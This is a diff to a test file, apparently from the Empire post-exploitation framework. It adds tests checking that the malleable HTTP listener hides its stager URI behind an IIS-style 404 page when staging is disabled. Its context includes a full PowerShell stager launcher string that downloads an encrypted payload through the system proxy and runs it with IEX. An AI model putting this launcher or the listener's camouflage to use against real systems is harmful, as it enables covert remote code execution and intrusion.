@@ -633,3 +633,106 @@ def _expected_redirector_python_launcher():
 
 def _expected_redirector_powershell_launcher():
     return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+
+
+def _drive_handle_request_setup(listener, monkeypatch):
+    """Run start_server() far enough to register the handle_request closure
+    on listener.app, without binding to a real port.
+
+    The malleable listener wires its request dispatcher as a closure inside
+    start_server(); calling it directly is the simplest seam. We unset
+    TEST_MODE (which otherwise short-circuits start_server before the Flask
+    app is created) and stub Flask.run so the function returns cleanly
+    instead of blocking on the port.
+    """
+    import flask
+
+    monkeypatch.delenv("TEST_MODE", raising=False)
+    monkeypatch.setattr(flask.Flask, "run", lambda *a, **kw: None)
+    listener.start_server(listener.options)
+    return listener.app.test_client()
+
+
+def test_host_stage_false_blocks_stager_uri_with_iis_404(
+    monkeypatch, main_menu_mock, caplog
+):
+    """`set host_stage "false";` must make the stager URI return the IIS
+    7.5 default 404 page, indistinguishable from a missing endpoint. The
+    gate fires for ANY method on the stager URI."""
+    import logging
+
+    from fastapi import status
+
+    from empire.server.common import malleable
+
+    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
+    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
+
+    # Toggle host_stage on the cached serialized profile. Doing it post-
+    # validate_options keeps the test independent of profile-text parsing —
+    # that's covered by the parser-level suite in test_malleable_profile.py.
+    profile = malleable.Profile._deserialize(listener.serialized_profile)
+    profile.host_stage = False
+    listener.serialized_profile = profile._serialize()
+
+    client = _drive_handle_request_setup(listener, monkeypatch)
+    caplog.set_level(logging.WARNING, logger="empire.server.listeners.http_malleable")
+
+    get_response = client.get("/init/")
+    assert get_response.status_code == status.HTTP_404_NOT_FOUND
+    assert "404 - File or directory not found." in get_response.get_data(as_text=True)
+
+    post_response = client.post("/init/", data=b"some-routing-packet")
+    assert post_response.status_code == status.HTTP_404_NOT_FOUND
+    assert "404 - File or directory not found." in post_response.get_data(as_text=True)
+
+    # The gate emits a WARNING with this specific phrase. Asserting on it
+    # locks the test to the gate itself, not to whichever 404 branch
+    # happens to be reachable — a refactor that moves the gate past the
+    # agentInfo extraction would lose the WARNING here even if the response
+    # body still happened to be 404 from a different branch.
+    expected_gate_warnings = 2  # one per request (GET + POST)
+    gate_warnings = [
+        r for r in caplog.records if "refusing stager URI" in r.getMessage()
+    ]
+    assert len(gate_warnings) == expected_gate_warnings, (
+        f"expected one gate WARNING per request, got {len(gate_warnings)}: "
+        f"{[r.getMessage() for r in gate_warnings]}"
+    )
+
+
+def test_host_stage_true_does_not_fire_gate(monkeypatch, main_menu_mock, caplog):
+    """With the default profile (host_stage implicitly True), hitting the
+    stager URI must NOT trigger the host_stage WARNING. We don't assert on
+    the response body because downstream stager generation depends on a
+    real MainMenu wiring that isn't present in this test; we just verify
+    the gate's negative path."""
+    import contextlib
+    import logging
+
+    from empire.server.common import malleable
+
+    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
+    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
+
+    # Fixture precondition: the amazon profile doesn't set host_stage, so
+    # it should default to True. If this assert ever fires, the parser
+    # default has drifted and the rest of the test is meaningless.
+    profile = malleable.Profile._deserialize(listener.serialized_profile)
+    assert profile.host_stage is True
+
+    client = _drive_handle_request_setup(listener, monkeypatch)
+    caplog.set_level(logging.WARNING, logger="empire.server.listeners.http_malleable")
+
+    # We don't care whether the response is a 200 stager, a 404 from a
+    # different branch, or a 500 from the mocked MainMenu — only that the
+    # host_stage gate did not fire.
+    with contextlib.suppress(Exception):
+        client.get("/init/")
+
+    gate_warnings = [
+        r for r in caplog.records if "refusing stager URI" in r.getMessage()
+    ]
+    assert gate_warnings == [], (
+        f"host_stage gate fired unexpectedly: {[r.getMessage() for r in gate_warnings]}"
+    )
